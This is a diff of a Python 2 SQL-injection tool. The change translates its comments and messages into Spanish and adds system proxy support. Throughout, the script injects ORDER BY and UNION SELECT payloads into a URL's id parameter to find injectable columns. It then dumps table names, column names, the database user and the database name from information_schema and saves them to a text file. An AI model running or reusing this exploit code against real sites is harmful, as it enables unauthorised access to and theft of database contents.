@@ -4,7 +4,7 @@ from urlparse import urlparse
 from collections import OrderedDict
 from bs4 import BeautifulSoup
 from pprint import pprint
-import requests, sys, difflib, array, re, argparse
+import requests, sys, difflib, array, re, argparse, urllib
 
 # Variables
 reload(sys)
@@ -14,27 +14,27 @@ columnas = []
 
 # Funciones
 
-# Define Arguments
+# Define Argumentos
 parser = argparse.ArgumentParser()
-parser.add_argument("-u", "--url", help="URL to scan, example: http://www.bar.foo/test/index.php?id=1")
-parser.add_argument("-t", "--table", help="Table to exploit")
+parser.add_argument("-u", "--url", help="URL a escanear")
+parser.add_argument("-t", "--table", help="Tabla a inyectar")
 args = parser.parse_args()
 if args.url:
     urlbase = args.url
 else:
-    print "Set URL with -u or --URL"
+    print "Defina URL con el argumento -u o --URL"
     sys.exit()
 args = parser.parse_args()
 if args.table:
     table = args.table
     
-# Adds ORDER BY
+# Agrega ORDER BY
 def order( url, num ):
     parts = urlparse(url)
     url   = url.replace(parts.query, 'id=-1+ORDER+BY+'+str(num)+'+--+')
     return url
 
-# Getting an exploitable column
+# Obtener columna inyectable
 def cual( url, num):
     x = 0
     stop  = '0'
@@ -57,7 +57,7 @@ def cual( url, num):
         break
     return x
     
-# Get columns
+# Obtiene columnas
 def columnas( tabla, url, num, cual ):
     cols  = []
     parts = urlparse(url)
@@ -87,7 +87,7 @@ def columnas( tabla, url, num, cual ):
             continue
     return cols
 
-# Gets username
+# Obtiene username
 def username( url, num, cual ):
     uname = '0'
     lista = '0'
@@ -110,10 +110,10 @@ def username( url, num, cual ):
     if uname != '0':
         uname = uname.replace('y!o-d!a', '')
     else:
-        uname = 'Not found'
+        uname = 'No encontrado'
     return uname
 
-# Gets current database name
+# Obtiene nombre de base de datos actual
 def bdname( url, num, cual ):
     bd    = '0'    
     lista = '0'
@@ -136,10 +136,10 @@ def bdname( url, num, cual ):
     if bd != '0':
         bd = bd.replace('y!o-d!a', '')
     else:
-        bd = 'Not found'
+        bd = 'No encontrado'
     return bd
 
-# Adds UNION
+# Agrega UNION
 def union( url, num ):
     parts = urlparse(url)
     lista = '0'
@@ -149,7 +149,7 @@ def union( url, num ):
     url   = url.replace(parts.query, 'id=-1+UNION+SELECT+'+str(lista)+'+FROM+information_schema.tables+--+')
     return url
 
-# Searching every table
+# Iterar Tables
 def iterar( elem ):
     element = elem.parent
     for x in range(1, 100):
@@ -162,7 +162,7 @@ def iterar( elem ):
            element = element.parent   
     return element
 
-# Search  by limit
+# Buscar por limit
 def limit( url, num, cual ):
     ret   = []
     parts = urlparse(url)
@@ -201,7 +201,7 @@ def limit( url, num, cual ):
             break
     return ret
     
-# Searching TABLES
+# Buscar TABLES
 def tables( url, cols, cual ):
     ret     = []
     element = '0'
@@ -237,7 +237,7 @@ def tables( url, cols, cual ):
         ret = limit(url, cols, cual)
     return ret
     
-# Removing disti (different)
+# Quitar disti
 def disti( index ):
     index = str(index)
     index = index.replace('disti', '')
@@ -245,7 +245,7 @@ def disti( index ):
     index = index.replace('-', '')
     return index 
 
-# Removing igual (equal)
+# Quitar igual
 def igual( index ):
     index = str(index)
     index = index.replace('igual', '')
@@ -253,7 +253,7 @@ def igual( index ):
     index = index.replace('-', '')
     return index 
 
-# Search between 'middle' numbers
+# Busca entre Mitades
 def mitad(urlbase):
     midpoint = 0
     first = 1
@@ -281,7 +281,7 @@ def mitad(urlbase):
             break
     return (midpoint-1)
        
-# Compares
+# Compara
 def compara( html1, html2 ):
     if html1 == html2:
         resp = 'igual'
@@ -289,15 +289,27 @@ def compara( html1, html2 ):
         resp = 'disti'       
     return resp
     
-# Get response
+# Obtiene respuesta
 def respo( url ):
-    response  = requests.get(url)
+
+    #http_proxy  = "http://proxy.bsch.ar:8080"
+    #https_proxy = "https://proxy.bsch.ar:8080"
+    #ftp_proxy   = "ftp://proxy.bsch.ar:8080"
+
+    #proxyDict = { 
+    #  "http"  : http_proxy, 
+    #  "https" : https_proxy,
+    #  "ftp"   : ftp_proxy
+    #}
+    #response  = requests.get(url)
+    #response  = requests.get(url, headers=headers, proxies=proxyDict)
+    response  = requests.get(url, proxies=urllib.getproxies())
     print url
     print response
     html      = response.text
     return html      
     
-# Remove order by from HTML
+# Quita order by de HTML
 def sacar( html, num ):
     muestra1  = '1 ORDER BY '+str(num)+' --'
     muestra2  = "Unknown column '"+str(num)+"' in"
@@ -319,8 +331,8 @@ url      = order(urlbase, rango)
 html1    = respo(urlbase)
 html2    = respo(url)
 resp     = compara(html1, html2)  
-if resp == 'equal':
-    print 'Not exploitable'
+if resp == 'igual':
+    print 'No inyectable'
 else:
     columna = mitad(urlbase)       
     url     = union(urlbase, int(columna))
@@ -338,29 +350,29 @@ else:
         cols = columnas(str(el),urlbase,int(columna), cual)
         col[str(el)] = cols
     col = dict((k, v) for k, v in col.iteritems() if v)    
-    print 'Table columns:'
+    print 'Columnas de tablas:'
     for k, v in col.iteritems():
         print '\n'
-        print 'Table: '+k
+        print 'Tabla: '+k
         for val in v:
             val = val.replace(',', '\n     ')
             print '     '+val
     print '\n############################\n'
-    print 'Col numbers on current table:'+str(columna)
+    print 'Numero de columnas en tabla actual:'+str(columna)
     print '\n############################\n'
-    print 'Tables in database:'
+    print 'Tablas en base:'
     for el in ele:
         print el
     print '\n############################\n'
-    print 'User:'+str(user)
+    print 'Usuario:'+str(user)
     print '\n############################\n'
-    print 'Database:'+str(bdna)
+    print 'Base de datos:'+str(bdna)
     if bdna:
         filename = bdna
         print '\n############################\n'
     else:
         pass
     text_file = open(str(bdna)+'.txt', 'w')
-    text_file.write('User:'+str(user)+'\r\n###################\r\n'+'Database:'+str(bdna)+'\r\n###################\r\nTables in database:'+str(ele)+'\r\n###################\r\n'+'Cols of tables:'+str(col))
+    text_file.write('Usuario:'+str(user)+'\r\n###################\r\n'+'Base de datos:'+str(bdna)+'\r\n###################\r\nTablas en base:'+str(ele)+'\r\n###################\r\n'+'Columnas de tablas:'+str(col))
     text_file.close()
-    print 'File '+filename+'.txt created'
+    print 'Archivo '+filename+'.txt creado'
